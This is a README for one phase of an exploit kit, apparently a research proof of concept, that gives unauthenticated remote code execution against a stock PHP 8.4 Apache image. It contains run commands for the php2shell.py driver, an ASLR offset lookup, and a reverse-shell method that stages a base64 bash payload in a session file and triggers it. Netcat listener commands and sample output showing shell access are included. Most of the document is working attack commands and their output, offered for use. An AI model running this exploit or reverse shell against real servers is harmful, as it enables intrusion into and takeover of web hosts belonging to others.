# Phase D: OOM to ASLR leak and fake HashTable

The why is in the root [README](../README.md). Unauthenticated RCE on a stock
`php:8.4.26-apache`, ASLR on, bases leaked over HTTP. The driver here is from dinosn's
`stock_aslr.py` (see Credits in the root README). Target on
`http://127.0.0.1:8083`. Authorised testing only.

## Setup

    docker compose up --build -d

## Run

The stock image runs the default prefork pool (`MaxRequestWorkers 150`), so
saturate with `--blockers 149` to land both requests on the free worker:

    python3 php2shell.py --url http://127.0.0.1:8083/index.php --blockers 149 --cmd 'id>/tmp/p'
    docker compose exec target cat /tmp/p
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Single-worker target? Use `--blockers 0`. Different build? Read the offsets off
the target's `libphp.so` and pass `--offsets libphp.so`, and add `--sweep-table`
if the fake-table landing is off:

    nm -D libphp.so | grep -E ' (zif_system|zval_ptr_dtor)$'

## Reverse shell

The fire's command slot is ~14 bytes (measured: 14 fires, 16 misses), too small
for a shell payload directly, so the payload is staged in a session file and the
fire just runs it. `upload_progress` writes
`<?php system(base64_decode('...bash reverse shell...'));?>` into `/tmp/sess_0`
(held open so `cleanup=On` doesn't wipe it), and the 14-byte fire runs
`php /tmp/s*` (11 bytes, a glob so the path fits), which executes the embedded
PHP. Needs `save_path=/tmp` (stock) and `sess_0` to sort first under `/tmp/s*`.

Start a listener (`nc -lvnp 4444`), then:

    python3 php2shell.py --url http://127.0.0.1:8083/index.php --blockers 149 \
        --lhost <LHOST> --lport 4444

`<LHOST>` is your listener as seen from the container (docker gateway or host LAN
IP). The staged session holds one worker, so the tool saturates with blockers-1
and keeps one free for the fire.

## Output

Command mode:

```
$ python3 php2shell.py --url http://127.0.0.1:8083/index.php --blockers 149 --cmd 'id>/tmp/p'
[+] LEAK chunk=0x7f0b76c00000 libphp=0x7f0b78973000
[*] fired table_off=0x690d8 attempt 6
$ docker compose exec target cat /tmp/p
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell (staged session + `php /tmp/s*`):

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 172.27.0.2 52722
www-data@6c25a1e3cdd0:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```
$ python3 php2shell.py --url http://127.0.0.1:8083/index.php --blockers 149 --lhost 172.27.0.1 --lport 4444
[*] payload session staged; reverse shell -> 172.27.0.1:4444
[+] LEAK chunk=0x7f7bb3800000 libphp=0x7f7bb550d000
[*] fired php /tmp/s* (1/6)
```

## Teardown

    docker compose down
